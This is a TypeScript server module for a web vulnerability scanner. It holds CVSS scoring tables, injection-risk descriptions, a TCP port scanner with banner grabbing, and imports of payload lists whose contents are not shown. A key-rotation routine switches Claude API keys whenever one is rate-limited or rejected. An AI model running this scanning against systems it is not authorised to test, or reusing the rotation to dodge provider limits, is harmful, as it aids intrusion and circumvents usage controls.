import type { Express } from "express";
import { createServer, type Server } from "http";
import { spawn } from "child_process";
import { scanRequestSchema, PAYLOADS } from "../shared/schema";
import {
  VULN_DATABASE,
  MEGA_SQL_PAYLOADS, MEGA_XSS_PAYLOADS, MEGA_LFI_PAYLOADS,
  MEGA_CMD_PAYLOADS, MEGA_SSTI_PAYLOADS, MEGA_SSRF_PAYLOADS,
  MEGA_XXE_PAYLOADS, MEGA_CRLF_PAYLOADS, MEGA_REDIRECT_PAYLOADS,
  MEGA_RFI_PAYLOADS, MEGA_NOSQL_PAYLOADS, MEGA_PROTOTYPE_PAYLOADS,
  MEGA_LDAP_PAYLOADS, MEGA_DESERIALIZATION_PAYLOADS,
  MEGA_HOST_INJECTION_PAYLOADS, MEGA_SENSITIVE_FILES,
  MEGA_ADMIN_PATHS, MEGA_BACKUP_FILES,
  SECURITY_HEADERS_CHECK, DANGEROUS_PORTS,
  VULNERABILITY_CATALOG,
  VULNERABILITY_CATALOG_BY_CATEGORY,
} from "./vulnerability-payloads";
import {
  protectedDomains as dbProtectedDomains,
  wafRules as dbWafRules,
  ipList as dbIpList,
  geoRules as dbGeoRules,
  rateLimitRules as dbRateLimitRules,
  securityHeaders as dbSecurityHeaders,
  bruteForceRules as dbBruteForceRules,
  honeypots as dbHoneypots,
  ipReputations as dbIpReputations,
  botScores as dbBotScores,
  threatLogs as dbThreatLogs,
} from "../shared/schema";
import type { VulnerabilityFinding, PortScanResult, DNSRecord, SSLCertInfo, SubdomainResult, DirectoryResult, WaybackUrl, CVSSScore } from "../shared/schema";
import { randomUUID } from "crypto";
import https from "https";
import http from "http";
import dns from "dns";
import net from "net";
import tls from "tls";
import { promisify } from "util";
import { db } from "./db";
import { eq, sql, desc, and } from "drizzle-orm";
import { existsSync } from "fs";
import { join } from "path";

// Helper: get db or throw (for shield endpoints that require DB)
function getDb() {
  if (!db) throw new Error("Database not configured");
  return db;
}

// Helper: sanitize req.body to only allow specified fields (prevents mass assignment)
function pickFields<T extends Record<string, unknown>>(body: T, allowed: string[]): Partial<T> {
  const result: Record<string, unknown> = {};
  for (const key of allowed) {
    if (key in body) result[key] = body[key];
  }
  return result as Partial<T>;
}
import { config } from "dotenv";

// Load environment variables
config();

// ═══════════════════════════════════════════════════════════════════════════════
// HEALTH CHECK ENDPOINT
// ═══════════════════════════════════════════════════════════════════════════════

export function registerHealthCheck(app: Express) {
  app.get("/api/health", (req, res) => {
    const health = {
      status: "healthy",
      timestamp: new Date().toISOString(),
      uptime: process.uptime(),
      environment: process.env.NODE_ENV || "development",
      checks: {
        database: db ? "connected" : "not configured",
        vuln_directory: existsSync(join(process.cwd(), "vuln")) ? "exists" : "missing",
        logs_directory: existsSync(join(process.cwd(), "logs")) ? "exists" : "missing",
        reports_directory: existsSync(join(process.cwd(), "reports")) ? "exists" : "missing",
      }
    };
    
    const allHealthy = Object.values(health.checks).every(v => v === "exists" || v === "connected" || v === "not configured");
    
    res.status(allHealthy ? 200 : 503).json(health);
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
// CLAUDE AI KEY ROTATION SYSTEM
// ═══════════════════════════════════════════════════════════════════════════════
const CLAUDE_API_KEYS = (process.env.CLAUDE_API_KEYS || "").split(",").map(k => k.trim()).filter(Boolean);
const CLAUDE_API_URL = process.env.CLAUDE_API_URL || "https://api.anthropic.com/v1/messages";
const CLAUDE_MODEL = process.env.CLAUDE_MODEL || "claude-sonnet-4-20250514";

let currentKeyIndex = 0;
const failedKeys = new Set<number>();

function getNextApiKey(): { key: string; index: number } | null {
  if (CLAUDE_API_KEYS.length === 0) return null;
  
  // Try to find a working key starting from current index
  for (let attempts = 0; attempts < CLAUDE_API_KEYS.length; attempts++) {
    const idx = (currentKeyIndex + attempts) % CLAUDE_API_KEYS.length;
    if (!failedKeys.has(idx)) {
      currentKeyIndex = (idx + 1) % CLAUDE_API_KEYS.length;
      return { key: CLAUDE_API_KEYS[idx], index: idx };
    }
  }
  
  // All keys failed - reset and try first one
  failedKeys.clear();
  currentKeyIndex = 0;
  return { key: CLAUDE_API_KEYS[0], index: 0 };
}

function markKeyFailed(index: number) {
  failedKeys.add(index);
  console.log(`[TEUFEL AI] Key #${index + 1} marked as failed. ${CLAUDE_API_KEYS.length - failedKeys.size} keys remaining.`);
}

async function callClaudeAPI(systemPrompt: string, userMessage: string, maxRetries: number = CLAUDE_API_KEYS.length): Promise<{ text: string; keyUsed: number }> {
  let lastError: Error | null = null;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const keyInfo = getNextApiKey();
    if (!keyInfo) throw new Error("No API keys configured");
    
    try {
      console.log(`[TEUFEL AI] Attempting with key #${keyInfo.index + 1}...`);
      
      const apiUrl = new URL(CLAUDE_API_URL);
      const postData = JSON.stringify({
        model: CLAUDE_MODEL,
        max_tokens: 4096,
        system: systemPrompt,
        messages: [{ role: "user", content: userMessage }],
      });
      
      const result = await new Promise<{ status: number; body: string }>((resolve, reject) => {
        const options = {
          hostname: apiUrl.hostname,
          port: apiUrl.port || (apiUrl.protocol === "https:" ? 443 : 80),
          path: apiUrl.pathname,
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "x-api-key": keyInfo.key,
            "anthropic-version": "2023-06-01",
            "Content-Length": Buffer.byteLength(postData),
          },
          timeout: 60000,
        };
        
        const reqModule = apiUrl.protocol === "https:" ? https : http;
        const req = reqModule.request(options, (res) => {
          let body = "";
          res.on("data", (chunk: Buffer | string) => { body += chunk; });
          res.on("end", () => resolve({ status: res.statusCode || 0, body }));
        });
        
        req.on("error", (err: Error) => reject(err));
        req.on("timeout", () => { req.destroy(); reject(new Error("Request timeout (60s)")); });
        req.write(postData);
        req.end();
      });
      
      console.log(`[TEUFEL AI] Key #${keyInfo.index + 1} returned HTTP ${result.status}`);
      
      if (result.status >= 200 && result.status < 300) {
        try {
          const data = JSON.parse(result.body);
          const text = data.content?.[0]?.text || "";
          console.log(`[TEUFEL AI] Success with key #${keyInfo.index + 1} - response length: ${text.length}`);
          return { text, keyUsed: keyInfo.index + 1 };
        } catch (parseErr) {
          console.log(`[TEUFEL AI] Key #${keyInfo.index + 1} returned invalid JSON: ${result.body.slice(0, 200)}`);
          markKeyFailed(keyInfo.index);
          lastError = new Error(`API key #${keyInfo.index + 1}: Invalid JSON response`);
          continue;
        }
      }
      
      // Rate limit or auth error - rotate to next key
      if (result.status === 429 || result.status === 401 || result.status === 403 || result.status === 529) {
        console.log(`[TEUFEL AI] Key #${keyInfo.index + 1} returned ${result.status}: ${result.body.slice(0, 300)}`);
        markKeyFailed(keyInfo.index);
        lastError = new Error(`API key #${keyInfo.index + 1}: HTTP ${result.status}`);
        continue;
      }
      
      // Other errors - still try next key
      console.log(`[TEUFEL AI] Key #${keyInfo.index + 1} error: HTTP ${result.status} - ${result.body.slice(0, 300)}`);
      markKeyFailed(keyInfo.index);
      lastError = new Error(`API key #${keyInfo.index + 1}: HTTP ${result.status} - ${result.body.slice(0, 200)}`);
    } catch (err: any) {
      markKeyFailed(keyInfo.index);
      lastError = err;
      console.log(`[TEUFEL AI] Key #${keyInfo.index + 1} network error: ${err.message}`);
    }
  }
  
  throw lastError || new Error("All API keys exhausted");
}

// ═══════════════════════════════════════════════════════════════════════════════
// PROFESSIONAL CVSS SCORING SYSTEM
// ═══════════════════════════════════════════════════════════════════════════════
const CVSS_DATABASE: Record<string, { cvss: CVSSScore; cwe: string; owasp: string }> = {
  sql_injection: {
    cvss: {
      score: 9.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "High"
    },
    cwe: "CWE-89", owasp: "A03:2021-Injection"
  },
  blind_sql_injection: {
    cvss: {
      score: 9.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "None"
    },
    cwe: "CWE-89", owasp: "A03:2021-Injection"
  },
  xss: {
    cvss: {
      score: 6.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "Required", scope: "Changed", confidentiality: "Low", integrity: "Low", availability: "None"
    },
    cwe: "CWE-79", owasp: "A03:2021-Injection"
  },
  stored_xss: {
    cvss: {
      score: 7.2, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Changed", confidentiality: "Low", integrity: "Low", availability: "None"
    },
    cwe: "CWE-79", owasp: "A03:2021-Injection"
  },
  lfi: {
    cvss: {
      score: 8.6, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "Low", availability: "Low"
    },
    cwe: "CWE-22", owasp: "A01:2021-Broken Access Control"
  },
  command_injection: {
    cvss: {
      score: 9.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "High"
    },
    cwe: "CWE-78", owasp: "A03:2021-Injection"
  },
  ssrf: {
    cvss: {
      score: 8.6, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Changed", confidentiality: "High", integrity: "None", availability: "None"
    },
    cwe: "CWE-918", owasp: "A10:2021-SSRF"
  },
  ssti: {
    cvss: {
      score: 9.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "High"
    },
    cwe: "CWE-94", owasp: "A03:2021-Injection"
  },
  xxe: {
    cvss: {
      score: 7.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "None", availability: "None"
    },
    cwe: "CWE-611", owasp: "A05:2017-XXE"
  },
  clickjacking: {
    cvss: {
      score: 4.3, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "Required", scope: "Unchanged", confidentiality: "None", integrity: "Low", availability: "None"
    },
    cwe: "CWE-1021", owasp: "A05:2021-Security Misconfiguration"
  },
  cors_misconfig: {
    cvss: {
      score: 5.3, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "Low", integrity: "None", availability: "None"
    },
    cwe: "CWE-942", owasp: "A05:2021-Security Misconfiguration"
  },
  insecure_headers: {
    cvss: {
      score: 5.3, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "Low", integrity: "None", availability: "None"
    },
    cwe: "CWE-693", owasp: "A05:2021-Security Misconfiguration"
  },
  open_redirect: {
    cvss: {
      score: 6.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "Required", scope: "Changed", confidentiality: "Low", integrity: "Low", availability: "None"
    },
    cwe: "CWE-601", owasp: "A01:2021-Broken Access Control"
  },
  information_disclosure: {
    cvss: {
      score: 5.3, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "Low", integrity: "None", availability: "None"
    },
    cwe: "CWE-200", owasp: "A01:2021-Broken Access Control"
  },
  sensitive_files: {
    cvss: {
      score: 7.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "None", availability: "None"
    },
    cwe: "CWE-538", owasp: "A01:2021-Broken Access Control"
  },
  admin_panels: {
    cvss: {
      score: 5.3, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "Low", integrity: "None", availability: "None"
    },
    cwe: "CWE-425", owasp: "A01:2021-Broken Access Control"
  },
  rce: {
    cvss: {
      score: 10.0, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Changed", confidentiality: "High", integrity: "High", availability: "High"
    },
    cwe: "CWE-94", owasp: "A03:2021-Injection"
  },
  path_traversal: {
    cvss: {
      score: 7.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "None", availability: "None"
    },
    cwe: "CWE-22", owasp: "A01:2021-Broken Access Control"
  },
  csrf: {
    cvss: {
      score: 6.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "Required", scope: "Unchanged", confidentiality: "None", integrity: "High", availability: "None"
    },
    cwe: "CWE-352", owasp: "A01:2021-Broken Access Control"
  },
  idor: {
    cvss: {
      score: 7.5, vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "Low",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "None", availability: "None"
    },
    cwe: "CWE-639", owasp: "A01:2021-Broken Access Control"
  },
  nosql_injection: {
    cvss: {
      score: 9.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "None"
    },
    cwe: "CWE-943", owasp: "A03:2021-Injection"
  },
  crlf_injection: {
    cvss: {
      score: 6.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "Required", scope: "Changed", confidentiality: "Low", integrity: "Low", availability: "None"
    },
    cwe: "CWE-93", owasp: "A03:2021-Injection"
  },
  backup_files: {
    cvss: {
      score: 6.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "None", availability: "None"
    },
    cwe: "CWE-530", owasp: "A01:2021-Broken Access Control"
  },
  rfi: {
    cvss: {
      score: 9.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "High"
    },
    cwe: "CWE-98", owasp: "A03:2021-Injection"
  },
  html_injection: {
    cvss: {
      score: 4.3, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "Required", scope: "Unchanged", confidentiality: "None", integrity: "Low", availability: "None"
    },
    cwe: "CWE-79", owasp: "A03:2021-Injection"
  },
  dom_xss: {
    cvss: {
      score: 6.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "Required", scope: "Changed", confidentiality: "Low", integrity: "Low", availability: "None"
    },
    cwe: "CWE-79", owasp: "A03:2021-Injection"
  },
  header_injection: {
    cvss: {
      score: 6.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "Required", scope: "Changed", confidentiality: "Low", integrity: "Low", availability: "None"
    },
    cwe: "CWE-113", owasp: "A03:2021-Injection"
  },
  insecure_deserialization: {
    cvss: {
      score: 9.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "High"
    },
    cwe: "CWE-502", owasp: "A08:2021-Data Integrity Failures"
  },
  prototype_pollution: {
    cvss: {
      score: 7.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "Low", integrity: "High", availability: "Low"
    },
    cwe: "CWE-1321", owasp: "A03:2021-Injection"
  },
  jwt_attack: {
    cvss: {
      score: 9.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "High"
    },
    cwe: "CWE-345", owasp: "A02:2021-Cryptographic Failures"
  },
  ldap_injection: {
    cvss: {
      score: 8.6, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "Low", availability: "Low"
    },
    cwe: "CWE-90", owasp: "A03:2021-Injection"
  },
  host_header_injection: {
    cvss: {
      score: 6.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "Required", scope: "Changed", confidentiality: "Low", integrity: "Low", availability: "None"
    },
    cwe: "CWE-644", owasp: "A05:2021-Security Misconfiguration"
  },
  exposed_database: {
    cvss: {
      score: 9.8, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "High"
    },
    cwe: "CWE-284", owasp: "A05:2021-Security Misconfiguration"
  },
  exposed_service: {
    cvss: {
      score: 7.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "None", availability: "None"
    },
    cwe: "CWE-284", owasp: "A05:2021-Security Misconfiguration"
  },
  git_exposure: {
    cvss: {
      score: 9.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "None"
    },
    cwe: "CWE-538", owasp: "A05:2021-Security Misconfiguration"
  },
  env_exposure: {
    cvss: {
      score: 9.1, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "High", availability: "None"
    },
    cwe: "CWE-538", owasp: "A05:2021-Security Misconfiguration"
  },
  cors_misconfiguration: {
    cvss: {
      score: 7.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "None", availability: "None"
    },
    cwe: "CWE-942", owasp: "A05:2021-Security Misconfiguration"
  },
  directory_listing: {
    cvss: {
      score: 5.3, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "Low", integrity: "None", availability: "None"
    },
    cwe: "CWE-548", owasp: "A05:2021-Security Misconfiguration"
  },
  debug_enabled: {
    cvss: {
      score: 7.5, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
      userInteraction: "None", scope: "Unchanged", confidentiality: "High", integrity: "None", availability: "None"
    },
    cwe: "CWE-215", owasp: "A05:2021-Security Misconfiguration"
  },
};

// Default CVSS for unknown types
const DEFAULT_CVSS: { cvss: CVSSScore; cwe: string; owasp: string } = {
  cvss: {
    score: 5.0, vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    attackVector: "Network", attackComplexity: "Low", privilegesRequired: "None",
    userInteraction: "None", scope: "Unchanged", confidentiality: "Low", integrity: "None", availability: "None"
  },
  cwe: "CWE-200", owasp: "A05:2021-Security Misconfiguration"
};

function getCVSSInfo(vulnType: string): { cvss?: CVSSScore; cwe?: string; owasp?: string } {
  const info = CVSS_DATABASE[vulnType];
  if (info) return info;
  // Return default CVSS for types not in database
  if (["info", "debug_enabled", "exposed_api"].includes(vulnType)) {
    return {}; // Info-level items don't need CVSS
  }
  return DEFAULT_CVSS;
}

function calculateExploitability(vulnType: string): "Easy" | "Medium" | "Hard" {
  const easyTypes = ["sql_injection", "xss", "lfi", "command_injection", "open_redirect"];
  const hardTypes = ["race_condition", "request_smuggling", "prototype_pollution"];
  if (easyTypes.includes(vulnType)) return "Easy";
  if (hardTypes.includes(vulnType)) return "Hard";
  return "Medium";
}

function calculateImpact(severity: string): "Critical" | "High" | "Medium" | "Low" {
  switch (severity) {
    case "critical": return "Critical";
    case "high": return "High";
    case "medium": return "Medium";
    default: return "Low";
  }
}

// Professional vulnerability builder with CVSS
function createProfessionalVuln(
  type: string,
  severity: "critical" | "high" | "medium" | "low" | "info",
  url: string,
  description: string,
  why: string,
  solution: string,
  reference: string,
  options?: {
    parameter?: string;
    payload?: string;
    evidence?: string;
    poc?: string;
    requestSample?: string;
    responseSample?: string;
  }
): VulnerabilityFinding {
  const cvssInfo = getCVSSInfo(type);
  return {
    id: randomUUID(),
    type,
    severity,
    url,
    description,
    why,
    solution,
    reference,
    recommendation: solution,
    timestamp: new Date().toISOString(),
    // Professional additions
    cvss: cvssInfo.cvss,
    cwe: cvssInfo.cwe,
    owasp: cvssInfo.owasp,
    verified: true,
    exploitability: calculateExploitability(type),
    impact: calculateImpact(severity),
    ...options
  };
}

const dnsResolve4 = promisify(dns.resolve4);
const dnsResolve6 = promisify(dns.resolve6);
const dnsResolveMx = promisify(dns.resolveMx);
const dnsResolveNs = promisify(dns.resolveNs);
const dnsResolveTxt = promisify(dns.resolveTxt);
const dnsResolveCname = promisify(dns.resolveCname);
const dnsResolveSoa = promisify(dns.resolveSoa);

// Field-specific risk context for professional vulnerability descriptions
function getFieldRiskContext(fieldName: string, vulnType: "sql" | "xss"): { risk: string; impact: string } {
  const fieldLower = fieldName.toLowerCase();
  
  // Authentication/Identity fields - highest risk
  if (fieldLower.includes("password") || fieldLower.includes("pass") || fieldLower.includes("pwd")) {
    return {
      risk: "Password Field Injection (Critical Risk)",
      impact: vulnType === "sql" 
        ? "This field directly handles authentication data. SQL injection here can bypass login entirely or extract all user credentials."
        : "XSS in password fields can capture credentials as users type, enabling mass account compromise."
    };
  }
  if (fieldLower.includes("user") || fieldLower.includes("login") || fieldLower.includes("account")) {
    return {
      risk: "Username/Account Field Injection (High Risk)",
      impact: vulnType === "sql"
        ? "Username fields often query user tables directly. Injection can enumerate all accounts or bypass authentication."
        : "XSS in username fields can steal session tokens or redirect to credential harvesting pages."
    };
  }
  if (fieldLower.includes("email") || fieldLower.includes("mail")) {
    return {
      risk: "Email Field Injection (High Risk)",
      impact: vulnType === "sql"
        ? "Email fields are commonly used for password resets and account lookups. Injection can expose PII or enable account takeover."
        : "XSS in email fields can be used for targeted phishing or session hijacking."
    };
  }
  
  // Personal data fields
  if (fieldLower.includes("name") || fieldLower.includes("first") || fieldLower.includes("last")) {
    return {
      risk: "Name Field Injection (Medium-High Risk)",
      impact: vulnType === "sql"
        ? "Name fields may be stored and displayed elsewhere, enabling second-order SQL injection or data extraction."
        : "Name fields are often displayed in multiple locations, enabling persistent XSS attacks across the application."
    };
  }
  if (fieldLower.includes("phone") || fieldLower.includes("tel") || fieldLower.includes("mobile")) {
    return {
      risk: "Phone/Contact Field Injection (Medium Risk)",
      impact: vulnType === "sql"
        ? "Phone fields may expose customer contact databases or enable targeted social engineering."
        : "XSS in phone fields can intercept form submissions or inject malicious content."
    };
  }
  if (fieldLower.includes("address") || fieldLower.includes("street") || fieldLower.includes("city")) {
    return {
      risk: "Address Field Injection (Medium Risk)",
      impact: vulnType === "sql"
        ? "Address fields can expose sensitive location data for all users in the system."
        : "XSS in address fields can be used for persistent attacks displayed on shipping/billing pages."
    };
  }
  if (fieldLower.includes("company") || fieldLower.includes("org") || fieldLower.includes("business")) {
    return {
      risk: "Company/Organization Field Injection (Medium Risk)",
      impact: vulnType === "sql"
        ? "Company fields may link to B2B customer databases with sensitive business information."
        : "XSS in company fields can compromise business accounts or enable corporate espionage."
    };
  }
  
  // Search and query fields
  if (fieldLower.includes("search") || fieldLower.includes("query") || fieldLower.includes("q")) {
    return {
      risk: "Search/Query Field Injection (High Risk)",
      impact: vulnType === "sql"
        ? "Search fields often construct dynamic queries. Injection can expose entire database contents or execute arbitrary SQL."
        : "Search results are typically reflected on the page, making XSS immediately exploitable."
    };
  }
  
  // File and ID fields
  if (fieldLower.includes("id") || fieldLower.includes("file") || fieldLower.includes("path")) {
    return {
      risk: "ID/Reference Field Injection (High Risk)",
      impact: vulnType === "sql"
        ? "ID fields directly reference database records. Injection enables IDOR attacks or complete data extraction."
        : "XSS in ID fields may enable DOM manipulation or redirect attacks."
    };
  }
  
  // Message and content fields
  if (fieldLower.includes("message") || fieldLower.includes("comment") || fieldLower.includes("content") || fieldLower.includes("text")) {
    return {
      risk: "Content/Message Field Injection (Medium-High Risk)",
      impact: vulnType === "sql"
        ? "Content fields may be stored for later display, enabling second-order SQL injection attacks."
        : "Message/comment fields are prime targets for stored XSS, affecting all users who view the content."
    };
  }
  
  // Default case
  return {
    risk: "Form Input Injection (Standard Risk)",
    impact: vulnType === "sql"
      ? "This input field processes user data without proper sanitization, potentially exposing database contents."
      : "This input reflects user content without encoding, enabling script injection attacks."
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// PORT SCANNER - Real Socket-based port scanning
// ═══════════════════════════════════════════════════════════════════════════════
const COMMON_PORTS: { port: number; service: string }[] = [
  { port: 21, service: "FTP" },
  { port: 22, service: "SSH" },
  { port: 23, service: "Telnet" },
  { port: 25, service: "SMTP" },
  { port: 53, service: "DNS" },
  { port: 80, service: "HTTP" },
  { port: 110, service: "POP3" },
  { port: 111, service: "RPCBind" },
  { port: 135, service: "MSRPC" },
  { port: 139, service: "NetBIOS" },
  { port: 143, service: "IMAP" },
  { port: 443, service: "HTTPS" },
  { port: 445, service: "SMB" },
  { port: 993, service: "IMAPS" },
  { port: 995, service: "POP3S" },
  { port: 1433, service: "MSSQL" },
  { port: 1521, service: "Oracle" },
  { port: 3306, service: "MySQL" },
  { port: 3389, service: "RDP" },
  { port: 5432, service: "PostgreSQL" },
  { port: 5900, service: "VNC" },
  { port: 6379, service: "Redis" },
  { port: 8080, service: "HTTP-Proxy" },
  { port: 8443, service: "HTTPS-Alt" },
  { port: 27017, service: "MongoDB" },
];

async function scanPort(host: string, port: number, timeout: number = 2000): Promise<PortScanResult> {
  const portInfo = COMMON_PORTS.find(p => p.port === port);
  const service = portInfo?.service || "Unknown";
  
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let banner = "";
    
    socket.setTimeout(timeout);
    
    socket.on("connect", () => {
      socket.on("data", (data) => {
        banner = data.toString().trim().substring(0, 100);
      });
      setTimeout(() => {
        socket.destroy();
        resolve({ port, state: "open", service, banner: banner || undefined });
      }, 500);
    });
    
    socket.on("timeout", () => {
      socket.destroy();
      resolve({ port, state: "filtered", service });
    });
    
    socket.on("error", () => {
      socket.destroy();
      resolve({ port, state: "closed", service });
    });
    
    socket.connect(port, host);
  });
}

